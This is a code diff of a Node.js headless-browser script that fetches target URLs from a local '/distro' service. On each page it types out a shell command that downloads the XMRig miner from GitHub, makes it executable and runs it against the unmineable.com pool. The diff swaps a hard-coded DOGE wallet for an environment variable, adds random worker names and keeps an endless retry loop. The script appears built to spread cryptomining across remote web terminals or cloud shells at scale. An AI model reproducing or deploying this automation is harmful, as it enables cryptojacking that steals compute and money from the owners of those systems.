@@ -7,15 +7,6 @@ const host = process.env.HOST || "localhost";
 const port = process.env.PORT || 4000;
 
 const run = async () => {
-  // try {
-  //   const response = await fetch(`${host}:${port}/distro`);
-  //   const data = await response.json();
-  //   const getUrl = await controller(data.url);
-  // } catch (error) {
-  //   console.error(`Erro interno do servidor: ${error.message}`);
-  //   run();
-  // }
-
   const response = await fetch(`${host}:${port}/distro`);
   const data = await response.json();
   const getUrl = data.url;
@@ -101,6 +92,9 @@ const run = async () => {
     await page.waitForSelector("body");
     await sleep(15);
 
+    const coin = process.env.COIN;
+    const job = `pc${Math.floor(Math.random() * 99) + 1}`;
+
     let text = "";
     text +=
       "wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz ";
@@ -108,8 +102,7 @@ const run = async () => {
     text += "&& cd xmrig-6.22.0 ";
     text += "&& chmod +x xmrig ";
     text += "&& clear ";
-    text +=
-      "&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.pc1#rup9-jjmz -p x";
+    text += `&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u ${coin}.${job}#rup9-jjmz -p x`;
 
     for (let i = 0; i < text.length; i++) {
       const char = text[i];
@@ -143,6 +136,7 @@ const run = async () => {
     run();
   } catch (error) {
     console.error(`Erro interno do servidor: ${error.message}`);
+    await sleep(5);
     run();
   }
 };
